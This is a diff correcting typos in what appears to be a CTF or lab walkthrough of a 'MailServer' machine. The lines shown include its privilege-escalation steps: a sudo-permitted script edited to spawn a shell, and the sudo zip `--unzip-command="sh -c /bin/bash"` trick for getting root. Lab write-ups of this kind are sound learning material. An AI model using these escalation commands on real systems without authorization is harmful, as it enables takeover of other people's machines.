@@ -110,7 +110,7 @@ ssh bob@192.168.1.6 -p2222
 ```
 Once we get access, we need to investigate if there's a way to root the mailServer.
 
-Were going to start with the obvious `sudo -l` which has some quite interesting results:
+We're going to start with the obvious `sudo -l` which has some quite interesting results:
 ```
 bob@MailServer:~$ sudo -l
 Matching Defaults entries for bob on MailServer:
@@ -126,7 +126,7 @@ So bob can execute the /opt/scripts/check.sh script as the my2user without passw
 Lets go edit the script:
 Just adding a `/bin/bash` at the end will do for spwaning a shell.
 
-Now lets run the script as th my2user:
+Now lets run the script as my2user:
 ```
 sudo -u my2user /bin/bash /opt/scripts/check.sh
 ```
@@ -141,7 +141,7 @@ Matching Defaults entries for my2user on MailServer:
 User my2user may run the following commands on MailServer:
     (root) NOPASSWD: /usr/bin/zip
 ```
-Lucky for us the my2user can execute `/usr/bin/zip` as root without a password. Doing a little googling, I found out that zip can execute arbitrary commands like this:
+Luckily for us the my2user can execute `/usr/bin/zip` as root without a password. Doing a little googling, I found out that zip can execute arbitrary commands like this:
 ```
 my2user@MailServer:~$ touch file
 my2user@MailServer:~$ sudo zip 1.zip file -T --unzip-command="sh -c /bin/bash"
